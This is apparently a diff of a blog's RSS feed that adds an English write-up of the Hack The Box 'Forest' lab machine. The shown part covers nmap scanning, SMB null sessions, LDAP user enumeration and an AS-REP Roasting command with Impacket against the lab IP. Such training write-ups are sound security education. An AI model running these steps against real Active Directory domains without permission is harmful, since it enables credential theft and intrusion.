@@ -6,7 +6,7 @@
     <link></link>
     <atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
     <author>
-      <name>Mateo Andino</name>
+      <name>MateoNitro550</name>
       <email></email>
       <uri>https://mateonitro550.github.io</uri>
     </author>
@@ -55,12 +55,12 @@
   &lt;/tbody&gt;
 &lt;/table&gt;
 
-&lt;p&gt;Si nos damos cuenta, en esta ocasión, el valor del &lt;em&gt;TTL&lt;/em&gt; es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;127&lt;/code&gt; y no &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;128&lt;/code&gt; como indica la tabla anterior, esto se debe a que en el entorno de máquinas de &lt;em&gt;Hack The Box&lt;/em&gt;, no nos comunicamos directamente con la máquina a vulnerar, sino que existe un intermediario, por lo que el &lt;em&gt;TTL&lt;/em&gt; disminuye en una unidad.&lt;/p&gt;
+&lt;p&gt;Si nos damos cuenta, en esta ocasión, el valor del &lt;em&gt;TTL&lt;/em&gt; es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;127&lt;/code&gt; y no &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;128&lt;/code&gt; como indica la tabla anterior, esto se debe a que en el entorno de máquinas de &lt;em&gt;Hack The Box&lt;/em&gt;, no nos comunicamos directamente con la máquina a vulnerar, sino que existe un nodo intermediario, por lo que el &lt;em&gt;TTL&lt;/em&gt; disminuye en una unidad.&lt;/p&gt;
 
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ping -c 1 10.10.10.161 -R
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/3.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/3a.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Posteriormente, vamos a utilizar la herramienta &lt;em&gt;Nmap&lt;/em&gt; para determinar que puertos están abiertos, así como identificar la versión y servicios que corren en el activo. Para determinar que puertos están abiertos podemos realizar lo siguiente:&lt;/p&gt;
 
@@ -152,6 +152,8 @@
 &lt;/table&gt;
 
 &lt;p&gt;Basándonos en la información que nos reporta &lt;em&gt;Nmap&lt;/em&gt;, podemos darnos cuenta que la máquina víctima tiene abiertos puertos relacionados con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DNS&lt;/code&gt; (53), &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Kerberos authentication&lt;/code&gt; (88), &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RPC&lt;/code&gt; (135), &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NetBIOS&lt;/code&gt; (139), &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LDAP&lt;/code&gt; (389), &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMB&lt;/code&gt; (445) y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WinRM&lt;/code&gt; (5985). Por lo que podemos intuir nos estamos enfrentando ante un &lt;em&gt;Domain Controller (DC)&lt;/em&gt; y nos encontramos en un entorno de &lt;em&gt;Active Directory (AD)&lt;/em&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;fase-de-explotación&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Fase De Explotación&lt;/h3&gt;
 
 &lt;p&gt;Lo primero que haremos será comprobar si la máquina cuenta con recursos compartidos a nivel de red a través del uso de un &lt;em&gt;null session&lt;/em&gt;, pues no contamos con credenciales; para ello podemos hacer uso de herramientas como &lt;em&gt;SMBMap&lt;/em&gt; o &lt;em&gt;smbclient&lt;/em&gt;, no obstante, no podremos listar nada.&lt;/p&gt;
 
@@ -333,11 +335,11 @@
 
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/21.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;A continuación, nos solicitará que cambiemos la contraseña; esta será la que utilizaremos para BloodHound.&lt;/p&gt;
+&lt;p&gt;A continuación, nos solicitará que cambiemos la contraseña; esta será la que utilizaremos para &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BloodHound&lt;/code&gt;.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/22.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;Una vez abramos BloodHound y nos logueemos, en la parte derecha veremos una sección que dice &lt;em&gt;Upload Data&lt;/em&gt;. Aquí es donde subiremos nuestro archivo comprimido.&lt;/p&gt;
+&lt;p&gt;Una vez abramos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BloodHound&lt;/code&gt; y nos logueemos, en la parte derecha veremos una sección que dice &lt;em&gt;Upload Data&lt;/em&gt;. Aquí es donde subiremos nuestro archivo comprimido.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/23.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
 
@@ -413,6 +415,408 @@
         <pubDate>Mon, 19 Aug 2024 00:00:00 -0400</pubDate>
         <link>/es/Forest-Hack-The-Box/</link>
         <guid isPermaLink="true">/es/Forest-Hack-The-Box/</guid>
+      </item>
+    
+      <item>
+        <title>Forest - Hack The Box</title>
+        <description>&lt;p&gt;Today we are going to solve &lt;em&gt;Hack The Box’s&lt;/em&gt; &lt;em&gt;Forest&lt;/em&gt; machine. It is a &lt;em&gt;Windows&lt;/em&gt; machine with a medium difficulty level for intrusion, and medium for privilege escalation as listed on the platform.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/1.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;reconnaissance-phase&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Reconnaissance Phase&lt;/h3&gt;
+
+&lt;p&gt;First, we’re going to launch an &lt;em&gt;ICMP traceroute&lt;/em&gt; to check if the machine is active.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ping -c 1 10.10.10.161
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/2.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Once we verify that the machine is active (as it returns a response), we can also determine what type of machine we are dealing with based on the &lt;em&gt;TTL&lt;/em&gt; value; in this case, the machine’s &lt;em&gt;TTL&lt;/em&gt; value is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;127&lt;/code&gt;, so we can infer that we are dealing with a &lt;em&gt;Windows&lt;/em&gt; machine. Remember, some of the reference values are as follows:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Operating System (OS)&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;TTL&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Linux&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;64&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Windows&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;128&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Solaris&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;254&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;If we notice, in this case, the &lt;em&gt;TTL&lt;/em&gt; value is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;127&lt;/code&gt; instead of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;128&lt;/code&gt; as indicated in the table above. This is because, in the &lt;em&gt;Hack The Box&lt;/em&gt; environment, we are not communicating directly with the target machine; instead, there is an intermediary node, which causes the &lt;em&gt;TTL&lt;/em&gt; to decrease by one unit.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ping -c 1 10.10.10.161 -R
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/3b.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Next, we will use the &lt;em&gt;Nmap&lt;/em&gt; tool to determine which ports are open, as well as identify the version and services running on the asset. To determine which ports are open, we can do the following:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 10.10.10.161
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;If the scan takes too long to complete, we have this alternative:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.161
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Below is an explanation of the parameters used in the port scan with &lt;em&gt;Nmap&lt;/em&gt;:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Parámetro&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Explicación&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-p-&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Scans the entire range of ports (65535 in total)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;--open&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Shows all ports that are open (or possibly open)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-T5&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;The timing template allows us to speed up our scan; this value can range from 0 to 5. Note that the higher the value of the template, the more “noise” we generate, but that’s okay, right? After all, we’re practicing in a controlled environment, and here we are all &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;White Hat&lt;/code&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-v&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;em&gt;Verbose&lt;/em&gt;, reports findings to the console&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-n&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Do not apply &lt;em&gt;DNS resolution&lt;/em&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-sS&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;em&gt;TCP SYN&lt;/em&gt; scan&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-min-rate&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Send packets no slower than &amp;lt;value&amp;gt; per second&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-vvv&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Triple &lt;em&gt;verbose&lt;/em&gt;, to get more information in the console&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-Pn&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Do not apply &lt;em&gt;host discovery&lt;/em&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Once we have detected the open ports on the asset, we can move on to determine the version and services running on these ports.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49684,49706,49957 10.10.10.161
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Below is an explanation of the parameters used in the version and service scan with &lt;em&gt;Nmap&lt;/em&gt;:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Parámetro&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Explicación&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-sC&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Basic enumeration scripts&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-sV&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Version and services running on the found ports&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-p&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Specify which ports we want to analyze (those found open in the previous step)&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;Based on the information reported by &lt;em&gt;Nmap&lt;/em&gt;, we can see that the target machine has open ports related to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DNS&lt;/code&gt; (53), &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Kerberos authentication&lt;/code&gt; (88), &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RPC&lt;/code&gt; (135), &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NetBIOS&lt;/code&gt; (139), &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LDAP&lt;/code&gt; (389), &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMB&lt;/code&gt; (445) and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WinRM&lt;/code&gt; (5985). We can infer that we are dealing with a &lt;em&gt;Domain Controller (DC)&lt;/em&gt; and we are in an &lt;em&gt;Active Directory (AD)&lt;/em&gt; environment.&lt;/p&gt;
+
+&lt;h3 id=&quot;exploitation-phase&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Exploitation Phase&lt;/h3&gt;
+
+&lt;p&gt;The first thing we’ll do is check if the machine has network-shared resources via a &lt;em&gt;null session&lt;/em&gt;, since we don’t have credentials; for this, we can use tools like &lt;em&gt;SMBMap&lt;/em&gt; or &lt;em&gt;smbclient&lt;/em&gt;. However, we won’t be able to list anything.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbmap &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; 10.10.10.161
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/4.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;smbclient &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 10.10.10.161
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/5.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Next, we can try to enumerate the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LDAP&lt;/code&gt; protocol to obtain information about users, groups, or other objects in the environment. To do this, we will use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ldapsearch&lt;/code&gt; tool.&lt;/p&gt;
+
+&lt;p&gt;Our first goal will be to identify the &lt;em&gt;Naming Context&lt;/em&gt;, which is the &lt;em&gt;Distinguished Name (DN)&lt;/em&gt; that represents the highest level in the &lt;em&gt;Directory Information Tree (DIT)&lt;/em&gt; and will serve as the base for our queries. We will use the following command:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ldapsearch &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; 10.10.10.161 &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; base namingcontexts
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/6.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The &lt;em&gt;dn&lt;/em&gt; field is empty because we are querying the base object of the directory. The &lt;em&gt;namingContexts&lt;/em&gt; fields list the different &lt;em&gt;Naming Contexts&lt;/em&gt; of the &lt;em&gt;LDAP&lt;/em&gt; server. Each entry in &lt;em&gt;namingContexts&lt;/em&gt; represents a different part of the &lt;em&gt;LDAP&lt;/em&gt; directory that can be the base for various searches.&lt;/p&gt;
+
+&lt;p&gt;We will use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DC=htb,DC=local&lt;/code&gt; as the basis for our queries because this is the main &lt;em&gt;Naming Context&lt;/em&gt; representing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;htb.local&lt;/code&gt; domain, including users, groups, and other main objects. The other &lt;em&gt;Naming Contexts&lt;/em&gt; (CN=Configuration, CN=Schema, DC=DomainDnsZones, DC=ForestDnsZones) are specific for configurations and schemas within the &lt;em&gt;AD&lt;/em&gt; environment.&lt;/p&gt;
+
+&lt;p&gt;Once we obtain the &lt;em&gt;DN&lt;/em&gt;, we can start making specific queries, or we could list all the &lt;em&gt;LDAP&lt;/em&gt; information with the following command:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ldapsearch &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; 10.10.10.161 &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;dc=htb,dc=local&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Parámetro&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Explicación&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-x&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Simple authentication&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-h&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Host&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-s&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Search scope&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;-b&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Base DN for the search&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;We can start by searching for entries that contain the &lt;em&gt;user&lt;/em&gt; object class to list system users.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ldapsearch &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; 10.10.10.161 &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;dc=htb,dc=local&quot;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;(objectClass=user)&apos;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/7.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;In the &lt;em&gt;sAMAccountName&lt;/em&gt; fields of each user, we will find their respective usernames. With a potential list of users at our disposal, we might consider an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AS-REP Roasting&lt;/code&gt; attack.&lt;/p&gt;
+
+&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AS-REP Roasting&lt;/code&gt; attack exploits a weakness in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Kerberos&lt;/code&gt; authentication in &lt;em&gt;Active Directory&lt;/em&gt; environments. This attack begins by sending an &lt;em&gt;Authentication Server Request (AS-REQ)&lt;/em&gt; message to the &lt;em&gt;DC&lt;/em&gt; for users who are configured not to require &lt;em&gt;Kerberos&lt;/em&gt; pre-authentication. If the user’s account is configured this way, the &lt;em&gt;DC&lt;/em&gt; will respond with an &lt;em&gt;Authentication Server Response (AS-REP)&lt;/em&gt; message, which contains a &lt;em&gt;Ticket Granting Ticket (TGT)&lt;/em&gt; issued by the &lt;em&gt;Key Distribution Center (KDC)&lt;/em&gt;. This &lt;em&gt;TGT&lt;/em&gt; may be vulnerable to brute-force attacks if the password is weak, allowing us to crack the user’s password without having to perform a full authentication. This vulnerability is exploited because the server responds with an &lt;em&gt;AS-REP&lt;/em&gt; message instead of rejecting the request due to the lack of pre-authentication.&lt;/p&gt;
+
+&lt;p&gt;With this in mind, instead of searching for users manually one by one, we can use a one-liner to filter and parse the users directly.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/8.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We can further refine the list of users obtained to focus exclusively on relevant accounts. The first two accounts, &lt;em&gt;DefaultAccount&lt;/em&gt; and &lt;em&gt;Guest&lt;/em&gt;, are created by the &lt;em&gt;AD&lt;/em&gt; itself (although &lt;em&gt;Guest&lt;/em&gt; is not enabled by default). Accounts ending in &lt;em&gt;$&lt;/em&gt; are &lt;em&gt;computer accounts&lt;/em&gt;, while the &lt;em&gt;$331000-VK4ADACQNUCA&lt;/em&gt; account has an unusual format and could be a specialservice account or automatically generated. Accounts starting with &lt;em&gt;SM_&lt;/em&gt; and &lt;em&gt;HealthMailbox&lt;/em&gt; are related to the &lt;em&gt;Microsoft Exchange&lt;/em&gt; service. This leaves us with five potential users for our analysis.&lt;/p&gt;
+
+&lt;p&gt;The next thing we’ll do is use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetNPUsers&lt;/code&gt; script from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Impacket&lt;/code&gt; suite. To run it, we need to provide the &lt;em&gt;AD&lt;/em&gt; domain name we want to target. To set this up, we will edit the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; file to ensure that the domain name resolves to the corresponding IP address of the server.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/9.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;With this done, the command we will use is the following:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;impacket-GetNPUsers htb.local/ &lt;span class=&quot;nt&quot;&gt;-no-pass&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-userfile&lt;/span&gt; archivoListadoUsuarios 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/10.png&quot; alt=&quot;&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
